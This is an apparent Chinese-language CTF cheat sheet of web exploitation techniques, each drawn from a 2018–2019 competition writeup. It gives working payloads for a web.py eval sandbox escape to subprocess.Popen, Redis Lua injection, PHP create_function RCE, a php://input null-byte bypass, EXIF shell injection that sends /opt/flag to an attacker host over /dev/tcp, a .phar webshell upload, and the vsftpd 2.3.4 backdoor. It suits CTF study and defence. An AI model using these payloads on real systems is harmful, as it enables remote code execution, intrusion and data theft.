**参考：** InCTF 2018 — TorPy，writeup 11519

---

<a id="webpy-reparam-eval--__subclasses__-with-blanked-builtins-hitcon-2018"></a>
## web.py reparam() eval + 内置函数被置空时的 __subclasses__（HITCON 2018）

**模式：** `web.py` 的 `reparam()` 用 `eval(expr, {"__builtins__": object()}, context)` 把 `${...}` 占位符插值进 SQL。`__builtins__` 被换成一个裸 `object()` 以封堵 `__import__`，但 `[].__class__.__base__.__subclasses__()` 仍能枚举所有已加载类 —— 包括 `subprocess.Popen`。`limit` 或 `order` 参数里类似 SQLi 的注入就能逃逸进 eval 上下文。

```python
# web.py 0.38 sink (db.select passes limit through reparam)
db.select('posts',
          limit=user_input,   # interpolated via ${...} eval
          order='ups desc')

# Payload — list all subclasses to locate Popen, then call it
user_input = (
    "1 ${[c for c in ().__class__.__base__.__subclasses__()"
    " if c.__name__ == 'Popen'][0](['/bin/sh','-c','cat /flag'],"
    "stdout=-1).communicate()[0]}"
)
```

**关键点：** 把 `__builtins__` 换成空对象能封住 `__import__`、`open`、`eval`，但类树遍历仍可到达沙箱建立前已导入的任意模块。任何未同时把 `__builtins__` 置为 `{"__builtins__": {}}` *并且* 限制 globals 的 Python eval，都可通过 `().__class__.__base__.__subclasses__()` 绕过。留意框架层 eval：Django 模板的 `{% eval %}`、web.py `reparam`、带自定义过滤器的 Flask Jinja、Mako 的 `<%...%>` 块。

**参考：** HITCON CTF 2018 — Oh My Raddit v2，writeup 11931

---

<a id="redis-lua-injection-via-rediscall-humanctf-2018"></a>
## 经 redis.call() 的 Redis Lua 注入（HumanCTF 2018）

**模式：** 应用执行 Redis Lua 脚本时，把用户可控参数拼进脚本源码，而不是作为 `ARGV` 传入。攻击者跳出字符串字面量并调用 `redis.call('GET', 'admin')` —— Lua 里直连 Redis 的桥 —— 读取被限制的 key。

```lua
-- Vulnerable script (string-concatenated)
local script = "return redis.call('GET', '" .. user_key .. "')"
redis.eval(script, 0)
```

```text
# Injected parameter
?n=123') and redis.call('get', 'admin') --

# Final Lua:
return redis.call('GET', '123') and redis.call('get', 'admin') -- ')
```

```python
import requests
r = requests.get("http://target/admin", params={
    "n": "123') and redis.call('get', 'admin') --"
})
print(r.text)
```

**关键点：** Redis Lua 脚本暴露 `redis.call()` 与 `redis.pcall()` —— 它们本就是 Lua 内访问 Redis 的官方通道，因此只要 Lua 注入成功，HTTP 层的 Redis 命令黑名单就毫无意义。不可信值一律走 `KEYS[...]` / `ARGV[...]`，绝不拼进脚本体。不得不用 Lua 时，用 `redis-cli SCRIPT LOAD` + SHA1 签名来约束脚本，并拒绝客户端未预编译的脚本。

**参考：** HumanCTF / HackOver 2018 — No vuln, trust me，writeup 11816

---

<a id="php-create_function-string-interpolation-rce-fireshell-2019"></a>
## PHP create_function 字符串插值 RCE（FireShell 2019）

**模式：** 经典 PHP gadget：服务端调用 `create_function('$a, $b', 'return strcmp($a->'.$order.', $b->'.$order.');')`，其中 `$order` 用户可控。提交 `; system($_GET[c]); return 0; //` 提前闭合 `strcmp`，在生成的匿名函数里执行任意 PHP。

```text
order=;system($_GET[c]);return 0;//
&c=id
```

**关键点：** 任何"从字符串生成代码再交给 `eval`/`create_function`/`assert`"的 PHP 函数，只要配上合适的分号/注释就能执行任意 PHP。在遗留代码库里 grep `create_function` —— PHP 8 已移除，但复刻 2018 年代应用的 CTF 里仍常见。

**参考：** FireShell CTF 2019 — Bad injections，writeup 12917

---

<a id="phpinput--null-byte--bitwise-base64-filter-bypass-defcamp-2018"></a>
## php://input + NULL 字节 + ~位运算绕过 base64 过滤（DefCamp 2018）

**模式：** `include` 端点期望 base64 编码的文件名。`base64_decode` 遇到非法输入会静默失败，但文件名仍会按 `$name.php` 落盘。注入 `name=z.php%00` 用 NULL 截断写入的文件名，再通过 POST 把 `data=_`.`~\x9c\x9e\x8b` 送到 `php://input`。PHP 的按位取反运算符（`~`）会把非 base64 字节变成 `cat` 之类的 ASCII 操作码，既绕过 base64 校验器，又能把可执行 PHP 落到磁盘。

```text
GET: ?name=z.php%00&file=php://input
POST body: <?=`~(chr(0x9c).chr(0x9e).chr(0x8b))`?>
```

随后请求 `GET /z.php?c=cat%20/flag`。

**关键点：** 只检查 URL 编码名的写入侧过滤器，可被 `%00` 绕过。只检查 base64 字符集的读取侧过滤器，可被 PHP 的非字符串按位运算符绕过 —— 它们生成的字节码相同，却永远匹配不上过滤正则。

**参考：** DefCamp CTF Finals 2018 — Scribbles，writeup 12131

---

<a id="exif-imagedescription-shell-injection-via-exiftool-otw-advent-2018"></a>
## 经 exiftool 的 EXIF ImageDescription shell 注入（OTW Advent 2018）

**模式：** 服务对上传图片运行 `exiftool`，并把 `-ImageDescription` 字段不加引号地拼进 shell 命令。先用攻击者可控的 exiftool 写入，把 `; command`（或 `$(cmd)`）直接塞进元数据，然后上传。

```bash
exiftool -ImageDescription="Santa ; /bin/bash -c 'cat /opt/flag > /dev/tcp/attacker/8081'" evil.jpg
curl -F upload=@evil.jpg http://target/
```

**关键点：** 用 `exiftool`、`identify`、`ffprobe` 解析元数据的图片上传汇点，经常把结果直接管道给 `exec`/`system`/`sh -c`。任何元数据字符串字段 —— `ImageDescription`、`Artist`、`Software`、GPS 标签 —— 都是 shell 注入点。修复方式：`escapeshellarg()`，或把元数据导出为 JSON 并对字段名做白名单。

**参考：** OverTheWire Advent 2018 — Santa's little recorders，writeup 12753

---

<a id="phar-extension-bypass-for-php-upload-blacklists-35c3-2018"></a>
## .phar 扩展名绕过 PHP 上传黑名单（35C3 2018）

**模式：** Apache 的 PHP handler 默认也匹配 `.phar`，但上传过滤器往往只拉黑 `.php`、`.phtml`、`.phps`。把 shell 改名为 `.phar`，在合法图片后追加 PHP payload 再上传 —— Apache handler 会按 PHP 解析。很多 XSS 防护/图片上传流程都能这样打穿。

```http
POST /upload HTTP/1.1
filename=shell.phar

[JPEG header] <?php system($_GET["c"]); ?>
```

**关键点：** 始终枚举 PHP handler 能接受的所有扩展名。默认配置下包括 `.php`、`.phtml`、`.phps`、`.php3`、`.php4`、`.php5`、`.php7` 和 `.phar`。上传黑名单必须把它们全部列上。

**参考：** 35C3 CTF 2018 — express-yourself，writeup 12880

---

<a id="vsftpd-234-smiley-face-backdoor-pwn-ctf-2018"></a>
## vsftpd 2.3.4 笑脸后门（P.W.N. CTF 2018）

**模式：** vsftpd 2.3.4 的源码分发被植入后门（CVE-2011-2523）：任何以 `:)` 结尾的用户名都会触发 TCP 6200 端口上的 bind shell。通过 FTP banner 或服务指纹识别出该版本，触发后门，连 6200 端口拿 root shell。

```bash
ftp target 21
USER anonymous:)
nc target 6200
```

**关键点：** 供应链后门永远存在。任何运行 vsftpd 2.3.4（banner 里有版本串）的 FTP 服务都中招。同类后门还命中过 proftpd-1.3.3c 和 unreal-ircd-3.2.8.1 —— 把这几组版本背下来。

**参考：** P.W.N. CTF 2018 — Very Secure FTP，writeup 12060

---

*另见：[server-side.md](server-side.md) —— 核心注入攻击（SQLi、SSTI、SSRF、XXE、命令注入、PHP 类型混淆、PHP 文件包含）。*
